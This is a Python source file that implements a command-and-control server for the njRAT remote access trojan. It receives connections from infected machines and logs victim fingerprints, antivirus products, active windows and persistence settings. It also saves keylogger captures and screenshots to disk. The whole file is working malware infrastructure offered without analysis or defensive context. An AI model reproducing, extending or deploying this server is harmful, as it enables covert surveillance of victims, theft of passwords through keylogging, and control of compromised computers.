import asyncio
import os
from datetime import datetime
from pathlib import Path
import uuid
import base64

PADDING = "Y262SUCZ4UJJ"

class Bot:
    def __init__(self, writer, addr):
        self.id = str(uuid.uuid4())[:8].upper()
        self.writer = writer
        self.addr = addr
        
        # Fingerprint data
        self.pc_name = "Unknown"
        self.bot_name = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.webcam = "Unknown"
        self.install_date = "Unknown"
        self.volume_id = "Unknown"
        self.AV = []
        
        # Additional data
        self.active_window = "Unknown"
        self.config_info = {}           # From 'inf' command
        self.last_seen = datetime.now()
        self.connected = True
        self.full_fingerprint = {}

    async def send(self, data: str):
        if not self.connected:
            return False
        try:
            msg = data.encode('utf-8')
            header = f"{len(msg)}\0".encode('utf-8')
            self.writer.write(header + msg)
            await self.writer.drain()
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            self.connected = False
            return False


class RATServer:
    def __init__(self):
        self.bots = {}
        self.screenshots_dir = Path("screenshots")
        self.keylogs_dir = Path("keylogs")
        self.screenshots_dir.mkdir(exist_ok=True)
        self.keylogs_dir.mkdir(exist_ok=True)
        self.loop = None

    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        bot = Bot(writer, addr)
        self.bots[bot.id] = bot

        print(f"[+] Bot connected: {addr} | ID: {bot.id}")

        try:
            while True:
                length_data = await reader.readuntil(b'\0')
                if not length_data:
                    break
                try:
                    length = int(length_data[:-1].decode('utf-8').strip())
                except ValueError:
                    break

                if length <= 0:
                    continue

                data = await reader.readexactly(length)
                await self.process_data(bot, data)
        except Exception as e:
            print(f"[-] Client error {addr}: {e}")
        finally:
            bot.connected = False
            if bot.id in self.bots:
                del self.bots[bot.id]
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass

    async def process_data(self, bot: Bot, raw_data: bytes):
        try:
            data = raw_data.decode('utf-8', errors='ignore')
            if not data:
                return

            parts = data.split(PADDING)
            cmd = parts[0]

            print(f"[+] [{bot.pc_name}] Received: {cmd}")

            if cmd == "ll":
                await self.handle_fingerprint(bot, parts)
            elif cmd == "act":
                await self.handle_active_window(bot, parts)
            elif cmd == "inf":
                await self.handle_config_info(bot, parts)
            elif cmd == "kl":
                await self.handle_keylog(bot, parts)
            elif cmd == "CAP":
                await self.handle_screenshot(bot, raw_data)
            elif cmd.startswith("ER"):
                print(f"[!] Bot error: {data}")
            else:
                print(f"[?] Unknown cmd: {cmd}")

            bot.last_seen = datetime.now()

        except Exception as e:
            print(f"[-] Process error: {e}")

    async def handle_fingerprint(self, bot: Bot, parts):
        try:
            bot.full_fingerprint = {"raw_parts": parts, "timestamp": datetime.now().isoformat()}

            if len(parts) > 1:
                try:
                    decoded = base64.b64decode(parts[1]).decode('utf-8', errors='ignore')
                    if '_' in decoded:
                        bot.bot_name, bot.volume_id = decoded.split('_', 1)
                    else:
                        bot.bot_name = decoded
                except:
                    pass

            bot.pc_name = parts[2] if len(parts) > 2 else bot.pc_name
            bot.username = parts[3] if len(parts) > 3 else bot.username
            bot.install_date = parts[4] if len(parts) > 4 else bot.install_date
            bot.os = parts[6] if len(parts) > 6 else bot.os
            bot.webcam = parts[7] if len(parts) > 7 else bot.webcam

            bot.AV = []
            for i in range(8, min(11, len(parts))):
                if parts[i] and parts[i] != "No AV" and parts[i].strip():
                    bot.AV.append(parts[i])

            print(f"[+] Fingerprint → {bot.pc_name}@{bot.username}")
        except Exception as e:
            print(f"[-] Fingerprint parse error: {e}")

    async def handle_active_window(self, bot: Bot, parts):
        """Handle 'act' command (current active window)"""
        try:
            if len(parts) > 1:
                try:
                    window_b64 = parts[1]
                    decoded = base64.b64decode(window_b64).decode('utf-8', errors='ignore')
                    cleaned = decoded.strip().replace('\r', '').replace('\n', '').replace('\x00', '')
                    bot.active_window = cleaned
                except Exception as e:
                    raw = parts[1].strip()
                    bot.active_window = raw.replace('\r', '').replace('\n', '')
                print(f"[+] Active Window [{bot.pc_name}]: {bot.active_window}")
        except Exception as e:
            print(f"[-] Active window parse error: {e}")

    async def handle_config_info(self, bot: Bot, parts):
        """Handle 'inf' command - base64 encoded config"""
        try:
            if len(parts) > 1 and parts[1]:
                try:
                    # Decode the base64 config data
                    config_b64 = parts[1]
                    decoded_bytes = base64.b64decode(config_b64)
                    config_text = decoded_bytes.decode('utf-8', errors='ignore')
                    
                    # Split by lines
                    lines = [line.strip() for line in config_text.splitlines() if line.strip()]
                    
                    bot.config_info = {
                        # "raw_base64": config_b64,
                        # "decoded_text": config_text,
                        "connection": lines[1] if len(lines) > 1 else "Unknown",      # ServerIP:Port
                        "temp_path": lines[2] if len(lines) > 2 else "Unknown",
                        "process_name": lines[3] if len(lines) > 3 else "Unknown",
                        "copy_to_tmp": lines[4] if len(lines) > 4 else "Unknown",
                        "copy_to_startup": lines[5] if len(lines) > 5 else "Unknown",
                        "use_run_key": lines[6] if len(lines) > 6 else "Unknown",
                        "critical_process": lines[7] if len(lines) > 7 else "Unknown",
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    print(f"[+] Config info decoded from {bot.pc_name}")
                    print(f"    → Loader: {bot.config_info['process_name']}, Temp: {bot.config_info['temp_path']}")
                    
                except Exception as decode_err:
                    print(f"[-] Base64 decode failed for inf: {decode_err}")
                    bot.config_info = {"raw_base64": parts[1], "decode_error": str(decode_err)}
            else:
                print(f"[-] Empty inf data from {bot.pc_name}")
                
        except Exception as e:
            print(f"[-] Config info handling error: {e}")

    async def handle_keylog(self, bot: Bot, parts):
        try:
            if len(parts) > 1:
                try:
                    keydata = base64.b64decode(parts[1]).decode('utf-8', errors='ignore')
                except:
                    keydata = parts[1]
                self.save_keylog(bot, keydata)
        except Exception as e:
            print(f"[-] Keylog error: {e}")

    async def handle_screenshot(self, bot: Bot, raw_data: bytes):
        try:
            header_len = len("CAP" + PADDING)
            img_bytes = raw_data[header_len:]
            if not img_bytes or img_bytes == b'\x00':
                return
            filename = f"{bot.pc_name.replace(' ', '_')}_{bot.id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            (self.screenshots_dir / filename).write_bytes(img_bytes)
            print(f"[+] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[-] Screenshot error: {e}")

    def save_keylog(self, bot: Bot, text: str):
        try:
            filename = f"{bot.username}@{bot.pc_name.replace(' ', '_')}_{bot.addr[0]}_{bot.id}.log"
            path = self.keylogs_dir / filename
            with open(path, "a", encoding="utf-8", errors='ignore') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text.replace('\0', '') \
                                                                   .replace('\r', '') \
                                                                   .replace('\x1b', '[ESC]') \
                                                                   .replace('\x01', '**') \
                                                                   }\n")
        except Exception as e:
            print(f"[-] Keylog save error: {e}")
        print(f"[+] Keylog saved at: {path}")

    async def start(self):
        self.loop = asyncio.get_running_loop()
        server = await asyncio.start_server(self.handle_client, '0.0.0.0', 6522)
        print("[*] njRAT C2 Socket Server running on port 6522")
        async with server:
            await server.serve_forever()